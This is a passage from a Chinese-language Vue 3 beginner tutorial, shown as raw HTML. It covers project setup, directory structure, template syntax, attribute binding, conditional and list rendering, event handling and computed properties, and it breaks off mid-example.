vue-project1</span><br><span class="line">√ 是否使用 TypeScript 语法？ ... 否 / 是</span><br><span class="line">√ 是否启用 JSX 支持？ ... 否 / 是</span><br><span class="line">√ 是否引入 Vue Router 进行单页面应用开发？ ... 否 / 是</span><br><span class="line">√ 是否引入 Pinia 用于状态管理？ ... 否 / 是</span><br><span class="line">√ 是否引入 Vitest 用于单元测试？ ... 否 / 是</span><br><span class="line">√ 是否要引入一款端到端（End to End）测试工具？ » 不需要</span><br><span class="line">√ 是否引入 ESLint 用于代码质量检测？ ... 否 / 是</span><br><span class="line"></span><br><span class="line">正在构建项目 D:\code\vue\start1\vue-project1...</span><br><span class="line"></span><br><span class="line">项目构建完成，可执行以下命令：</span><br><span class="line"></span><br><span class="line">  cd vue-project1</span><br><span class="line">  npm install</span><br><span class="line">  npm run dev</span><br></pre></td></tr></table></figure><p>然后</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">D:\code\vue\start1&gt;cd vue-project1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">D:\code\vue\start1\vue-project1&gt;npm install</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">D:\code\vue\start1\vue-project1&gt;npm run dev</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">vue-project1@0.0.0 dev</span></span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">vite</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  VITE v4.5.0  ready in 350 ms</span><br><span class="line"></span><br><span class="line">  ➜  Local:   http://localhost:5173/</span><br><span class="line">  ➜  Network: use --host to expose</span><br><span class="line">  ➜  press h to show help</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后项目就在<code> http://localhost:5173/</code>了</p><blockquote><p>创建Vue项目的命令是什么：</p><p><code>npm creat-vue project</code></p><p><code>npm create vue project</code></p><p><code>npm create-react project</code></p><p><code>npm init vue@latest</code></p></blockquote><h2 id="Vue项目目录结构"><a href="#Vue项目目录结构" class="headerlink" title="Vue项目目录结构"></a>Vue项目目录结构</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.vscode         ———VSCode工具的配置文件</span><br><span class="line">node_modules        ———Vue项目的运行依赖文件         执行`npm install`之后就会有</span><br><span class="line">public———资源文件夹(浏览器图标)</span><br><span class="line">src———源码文件夹</span><br><span class="line">.gitignore ———git忽略文件</span><br><span class="line">index.html  ———入口HTML文件</span><br><span class="line">package.json———信息描述文件</span><br><span class="line">README.md———注释文件</span><br><span class="line">vite.config.js———Vue配置文件</span><br></pre></td></tr></table></figure><h2 id="模板语法"><a href="#模板语法" class="headerlink" title="模板语法"></a>模板语法</h2><p>Vue使用一种基于HTMl的模板语法，使我们能够声明式地将其组件实例的数据绑定到呈现的DOM上。所有的Vue模板都是语法层面合法的HTML，可以被符合规范的浏览器和HTML解析器解析。</p><h3 id="文本插值"><a href="#文本插值" class="headerlink" title="文本插值"></a>文本插值</h3><p>最基本的数据绑定形式是文本插值，它使用的是”Mustache”语法(即双大括号)：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">  export default &#123;</span><br><span class="line">    data() &#123;</span><br><span class="line">      return&#123;</span><br><span class="line">        msg: &#x27;Hello World!&#x27;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;h1&gt;模板语法&lt;/h1&gt;</span><br><span class="line">  &lt;p&gt;&#123;&#123; msg &#125;&#125;&lt;/p&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="使用-JavaScript-表达式"><a href="#使用-JavaScript-表达式" class="headerlink" title="使用 JavaScript 表达式"></a>使用 JavaScript 表达式</h5><p>每一个绑定仅支持<strong>单一表达式</strong>，也就是一段能够被求值的 JavaScript 代码。一个简单的判断方式是是否可以合法地写在 <code>return</code> 后面</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">  export default &#123;</span><br><span class="line">    data() &#123;</span><br><span class="line">      return&#123;</span><br><span class="line">        number: 1,</span><br><span class="line">        ok: true,</span><br><span class="line">        message: &#x27;Hello World!&#x27;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;h1&gt;使用JavaScript表达式&lt;/h1&gt;</span><br><span class="line">  &lt;p&gt;&#123;&#123; number + 1 &#125;&#125;&lt;/p&gt;</span><br><span class="line">  &lt;p&gt;&#123;&#123; ok ? &#x27;Yes&#x27; : &#x27;No&#x27; &#125;&#125;&lt;/p&gt;</span><br><span class="line">  &lt;p&gt;&#123;&#123; message.split(&#x27;&#x27;).reverse().join(&#x27;&#x27;) &#125;&#125;&lt;/p&gt;</span><br><span class="line">&lt;/template&gt;</span><br></pre></td></tr></table></figure><p>无效：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--这是一个语句，而非表达式--&gt;</span><br><span class="line">&#123;&#123;var a = 1&#125;&#125;</span><br><span class="line"></span><br><span class="line">&lt;!--条件控制也不支持，请使用三元表达式--&gt;</span><br><span class="line">&#123;&#123;if(ok) &#123;return message&#125; &#125;&#125;</span><br></pre></td></tr></table></figure><h5 id="原始HTML"><a href="#原始HTML" class="headerlink" title="原始HTML"></a>原始HTML</h5><p>双大括号会将数据插值为纯文本，而不是HTML。若想插入HTML，你需要使用<code>v-html</code>指令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">  export default &#123;</span><br><span class="line">    data() &#123;</span><br><span class="line">      return&#123;</span><br><span class="line">        rawHTML:&quot;&lt;span style=&#x27;color:red&#x27;&gt;我是红色的&lt;/span&gt;&quot;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;h1&gt;原始HTML&lt;/h1&gt;</span><br><span class="line">  &lt;p&gt;纯文本&lt;/p&gt;</span><br><span class="line">  &lt;p&gt;属性：&lt;span v-html = &quot;rawHTML&quot;&gt;&lt;/span&gt;&lt;/p&gt;</span><br><span class="line"></span><br><span class="line">&lt;/template&gt;</span><br></pre></td></tr></table></figure><h3 id="属性绑定"><a href="#属性绑定" class="headerlink" title="属性绑定"></a>属性绑定</h3><p>双大括号不能在<code>HTML attributes</code>中使用。想要响应式地绑定一个<code>attribute</code>，应该使用<code>v-bind</code>指令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div v-bind:id=&quot;dynamicId&quot; v-bind:class=&quot;msg&quot;&gt;测试&lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line"></span><br><span class="line">  export default &#123;</span><br><span class="line">    data() &#123;</span><br><span class="line">      return &#123;</span><br><span class="line">        msg: &quot;active&quot;,</span><br><span class="line">        dynamicId: &quot;appID&quot;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><ul><li><code>v-bind</code>指令指示Vue将元素的<code>id</code>attribute与组件的<code>dynamicId</code>属性保持一致。如果绑定的值是<code>null</code>或者<code>undefined</code>，那么该atteibute将会从渲染的元素上移除</li></ul><h4 id="简写"><a href="#简写" class="headerlink" title="简写"></a>简写</h4><p><code>&lt;div :id=&quot;dynamicId&quot; :class=&quot;dynamicClass&quot;&gt;&lt;/div&gt;</code></p><h3 id="渲染"><a href="#渲染" class="headerlink" title="渲染"></a>渲染</h3><h4 id="条件渲染"><a href="#条件渲染" class="headerlink" title="条件渲染"></a>条件渲染</h4><p>在<code>Vue</code>中，提供了条件渲染，类似于<code>javaScript</code>中的条件语句</p><ul><li>v-if</li><li>v-else</li><li>v-else-if</li><li>v-show</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;  </span><br><span class="line">&lt;h3&gt;条件渲染&lt;/h3&gt;</span><br><span class="line">&lt;div v-if=&quot;flag&quot;&gt;can you see me?&lt;/div&gt;</span><br><span class="line">&lt;div v-else&gt;看来是看不见了&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;div v-if=&quot;type === &#x27;A&#x27;&quot;&gt;A&lt;/div&gt;</span><br><span class="line">&lt;div v-else-if=&quot;type === &#x27;B&#x27;&quot;&gt;B&lt;/div&gt;</span><br><span class="line">&lt;div v-else-if=&quot;type === &#x27;C&#x27;&quot;&gt;C&lt;/div&gt;</span><br><span class="line">&lt;div v-else&gt;Not A/B/C&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;div v-show = &quot;flag&quot;&gt;你看看我吧&lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;script&gt;    </span><br><span class="line">export default &#123;</span><br><span class="line">  data() &#123;</span><br><span class="line">    return &#123;</span><br><span class="line">      flag: true,</span><br><span class="line">      type: &#x27;D&#x27;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><blockquote><p><code>v-if </code>vs <code>v-show</code></p></blockquote><ul><li><code>v-if</code>是真实的按条件渲染，因为它确保了在切换时，条件区块内的时间监听器和子组件都会被销毁和重建</li><li><code>v-if</code>也是惰性的：如果在初次渲染时条件值为false，则不会做任何事。条件区块只有当条件首次变为true时才被渲染</li><li>相比之下，<code>v-show</code>简单许多，元素无论初始条件如何，始终会被渲染，只有CSS<code>display</code>属性会被切换</li></ul><p>总的来说，<code>v-if</code>有更高的切换开销，而<code>v-show</code>有更高的初始渲染开销。因此，如果需要频繁切换，则使用<code>v-show</code>较好，如果在运行时绑定条件很少改变，则<code>v-if</code>会更合适</p><h4 id="列表渲染"><a href="#列表渲染" class="headerlink" title="列表渲染"></a>列表渲染</h4><p>我们可以使用<code>v-for</code>指令基于一个数组来渲染一个列表。<code>v-for</code>指令的值需要使用<code>item in items</code>形式的特殊语法，其中<code>items</code>是源数据的数组，而<code>item</code>是迭代项的别名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">&lt;h1&gt;列表渲染&lt;/h1&gt;</span><br><span class="line">&lt;p v-for=&quot;item in names&quot;&gt; &#123;&#123;item&#125;&#125;&lt;/p&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">export default &#123;</span><br><span class="line">    data() &#123;</span><br><span class="line">        return&#123;</span><br><span class="line">            names:[&#x27;111&#x27;,&#x27;222&#x27;,&#x27;333 &#x27;]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h5 id="复杂数据"><a href="#复杂数据" class="headerlink" title="复杂数据"></a>复杂数据</h5><p>大多数情况，我们渲染的数据源来源于网络请求，也就是JSON格式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">&lt;h1&gt;json数据列表渲染&lt;/h1&gt;</span><br><span class="line">&lt;div v-for=&quot;item in result&quot;&gt;</span><br><span class="line">    &lt;p&gt;&#123;&#123; item.tittle &#125;&#125;&lt;/p&gt;</span><br><span class="line">    &lt;p&gt;&#123;&#123; item.content &#125;&#125;&lt;/p&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">    export default &#123;</span><br><span class="line">        data() &#123;</span><br><span class="line">            return&#123;</span><br><span class="line">                result:[&#123;</span><br><span class="line">                    tittle:&#x27;标题1&#x27;,</span><br><span class="line">                    content:&#x27;内容1&#x27;</span><br><span class="line">                &#125;,&#123;</span><br><span class="line">                    tittle:&#x27;标题2&#x27;,</span><br><span class="line">                    content:&#x27;内容2&#x27;</span><br><span class="line">                &#125;,&#123;</span><br><span class="line">                    tittle:&#x27;标题3&#x27;,</span><br><span class="line">                    content:&#x27;内容3&#x27;&#125;]</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><blockquote><p><code>v-for</code>也支持使用可选的第二个参数表示当前项的位置索引：</p></blockquote><p><code>&lt;p v-for=&quot;(item,index) in names&quot;&gt; &#123;&#123;item&#125;&#125;-&gt;&#123;&#123; index &#125;&#125;&lt;/p&gt;</code></p><blockquote><p>也可以使用<code>of</code>作为分隔符来替代<code>in</code>，这更接近JavaScript的迭代器语法</p></blockquote><p><code>&lt;div v-for=&quot;item of items&quot;&gt;&lt;/div&gt;</code></p><blockquote><p>通过key管理状态</p></blockquote><p>Vue默认按照“就地更新”的策略来更新通过<code>v-for</code>的元素列表。当数据项的顺序改变时，Vue不会随之移动DOM元素的顺序，而是就地更新每个元素，确保它们在原本指定的索引 位置上渲染。</p><p>为了给Vue一个提示，以便它可以跟踪每个结点的标识，从而重用和重新排序现有的元素，需要为每一本元素提供对应的一个唯一的<code>key</code>attribute</p><p><code>&lt;p v-for=&quot;(item,index) in names&quot; :key = &quot;index&quot;&gt; &#123;&#123;item&#125;&#125;&lt;/p&gt; </code></p><h2 id="事件"><a href="#事件" class="headerlink" title="事件"></a>事件</h2><h3 id="事件处理"><a href="#事件处理" class="headerlink" title="事件处理"></a>事件处理</h3><p>我们可以使用<code>v-on</code>指令(简写为<code>@</code>)来监听DOM事件，并在事件触发时执行对应的JavaScript。用法：<code>v-on:click=&quot;mathodName&quot;</code>或者<code>@click=&quot;handler&quot;</code></p><p>事件处理器的值可以是：</p><ul><li>内联事件处理器：事件被触发时执行的内联JavaScript语句，与onclick相似</li><li>方法事件处理器：一个指向组件上定义的方法的属性名或是路径</li></ul><h4 id="内联事件处理器"><a href="#内联事件处理器" class="headerlink" title="内联事件处理器"></a>内联事件处理器</h4><p>通常用于简单场景</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">&lt;button @click = &quot;count++&quot;&gt;Add 1&lt;/button&gt;</span><br><span class="line">    &lt;button v-on:click = &quot;count=0&quot;&gt;clear&lt;/button&gt;</span><br><span class="line">    &lt;p&gt;Count is &#123;&#123; count &#125;&#125;&lt;/p&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;    </span><br><span class="line">export default &#123;</span><br><span class="line">  data() &#123;</span><br><span class="line">    return &#123;</span><br><span class="line">      count: 0</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h4 id="方法事件处理器"><a href="#方法事件处理器" class="headerlink" title="方法事件处理器"></a>方法事件处理器</h4><p>更普遍</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">&lt;button @click = &quot;addCount&quot;&gt;Add 1&lt;/button&gt;</span><br><span class="line">    &lt;button v-on:click = &quot;ClearCount&quot;&gt;clear&lt;/button&gt;    </span><br><span class="line">    &lt;p&gt;Count is &#123;&#123; count &#125;&#125;&lt;/p&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;    </span><br><span class="line">export default &#123;</span><br><span class="line">  data() &#123;</span><br><span class="line">    return &#123;</span><br><span class="line">      count: 0</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  methods:&#123;       //所有的方法/函数都放methods里面</span><br><span class="line">      addCount()&#123;</span><br><span class="line">          this.count++;     //读取到data里面的count并加1</span><br><span class="line">      &#125;,</span><br><span class="line">      ClearCount()&#123;</span><br><span class="line">          this.count=0;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3 id="事件参数"><a href="#事件参数" class="headerlink" title="事件参数"></a>事件参数</h3><p>事件参数可以获取<code>event</code>对象和通过事件传递数据</p><blockquote><p>获取<code>event</code>对象</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">    &lt;h1&gt;事件参数&lt;/h1&gt;&gt;</span><br><span class="line">&lt;button @click = &quot;addCount&quot;&gt;Add&lt;/button&gt;</span><br><span class="line">    &lt;button v-on:click = &quot;ClearCount&quot;&gt;clear&lt;/button&gt;    </span><br><span class="line">    &lt;p&gt;Count is &#123;&#123; count &#125;&#125;&lt;/p&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;    </span><br><span class="line">export default &#123;</span><br><span class="line">  data() &#123;</span><br><span class="line">    return &#123;</span><br><span class="line">      count: 0</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  methods:&#123;       //所有的方法/函数都放methods里面</span><br><span class="line">      addCount(e)&#123;       //vue中的event对象，就是原生JS对象</span><br><span class="line">        e.target.style.color = &#x27;red&#x27;;</span><br><span class="line">        this.count++;     //读取到data里面的count并加1</span><br><span class="line">      &#125;,</span><br><span class="line">      ClearCount()&#123;</span><br><span class="line">          this.count=0;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><blockquote><p>传递参数</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">    &lt;h1&gt;事件参数&lt;/h1&gt;&gt;</span><br><span class="line">&lt;button @click = &quot;addCount(&#x27;hello&#x27;)&quot;&gt;Add&lt;/button&gt;</span><br><span class="line">    &lt;button v-on:click = &quot;ClearCount&quot;&gt;clear&lt;/button&gt;    </span><br><span class="line">    &lt;p&gt;Count is &#123;&#123; count &#125;&#125;&lt;/p&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;    </span><br><span class="line">export default &#123;</span><br><span class="line">  data() &#123;</span><br><span class="line">    return &#123;</span><br><span class="line">      count: 0</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  methods:&#123;       //所有的方法/函数都放methods里面</span><br><span class="line">      addCount(msg)&#123;       //把hello传递过来</span><br><span class="line">        this.count++;     //读取到data里面的count并加1</span><br><span class="line">        console.log(msg);</span><br><span class="line">      &#125;,</span><br><span class="line">      ClearCount()&#123;</span><br><span class="line">          this.count=0;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h4 id="事件修饰符"><a href="#事件修饰符" class="headerlink" title="事件修饰符"></a>事件修饰符</h4><p>在处理事件时调用<code>event.preventDefault()</code>或<code>event.stopPropagation()</code>是很常见的。尽管我们可以直接在方法内调用，但如果方法能专注于数据逻辑而不是去处理DOM事件的细节会更好。为解决这一问题，Vue为<code>v-on</code>提供了事件修饰符，常用的有以下几个</p><ul><li>.stop</li><li>.prevent</li><li>.once</li><li>.enter</li></ul><blockquote><p>阻止默认事件</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">    &lt;h1&gt;事件修饰符&lt;/h1&gt;&gt;</span><br><span class="line">&lt;button&gt;&lt;a @click=&quot;clickHandle&quot; href=&quot;https://psych.green&quot;&gt;我的博客&lt;/a&gt;&lt;/button&gt;&gt;</span><br><span class="line">    &lt;p&gt;Count is &#123;&#123; count &#125;&#125;&lt;/p&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;    </span><br><span class="line">export default &#123;</span><br><span class="line">  data() &#123;</span><br><span class="line">    return &#123;</span><br><span class="line">      count: 0</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  methods:&#123;       </span><br><span class="line">      clickHandle(e)&#123;     </span><br><span class="line">        e.preventDefault();</span><br><span class="line">        console.log(&#x27;点击了但是阻止跳转&#x27;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h2 id="数组变化侦测"><a href="#数组变化侦测" class="headerlink" title="数组变化侦测"></a>数组变化侦测</h2><ul><li>变更方法-&gt;Vue能够侦听响应式数组的变更方法，并在它们被调用时触发相关的更新。包括：<ul><li>push()</li><li>pop()</li><li>shift()</li><li>unshift()</li><li>splice()</li><li>sort()</li><li>reverse()</li></ul></li><li>替换一个数组-&gt;不会更改原数组，而是返回一个新数组。当遇到的是非变更方法时，我们需要将旧的数组替换为新的。包括：<ul><li>filter()</li><li>concat()</li><li>slice()</li></ul></li></ul><h2 id="计算属性"><a href="#计算属性" class="headerlink" title="计算属性"></a>计算属性</h2><h3 id="computed"><a href="#computed" class="headerlink" title="computed"></a><code>computed</code></h3><p>模板中的表达式虽然方便，但是也只能用来做简单的操作。如果在模板中写太多逻辑，会让模板变得臃肿，难以维护。因此我们推荐使用计算属性来描述依赖响应式状态的复杂逻辑</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">&lt;h1&gt;计算属性&lt;/h1&gt;</span><br><span class="line">&lt;p&gt;全名：&#123;&#123;fullName&#125;&#125;&lt;/p&gt;</span><br><span class="line">&lt;p&gt;是否成年：&#123;&#123;isAdult&#125;&#125;&lt;/p&gt;</span><br><span class="line"></span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">export default &#123;</span><br><span class="line">    data() &#123;</span><br><span class="line">        return &#123;</span><br><span class="line">            firstName: &#x27;John&#x27;,</span><br><span class="line">            lastName: &#x27;Doe&#x27;,</span><br><span class="line">            age: 20</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    computed: &#123;</span><br><span class="line">        fullName() &#123;</span><br><span class="line">            return this.firstName + &#x27; &#x27; + this.lastName</span><br><span class="line">        &#125;,</span><br><span class="line">        isAdult() &#123;</span><br><span class="line">            return this.age &gt;= 18</span><br><span class="line">        &#125;</span><br><span 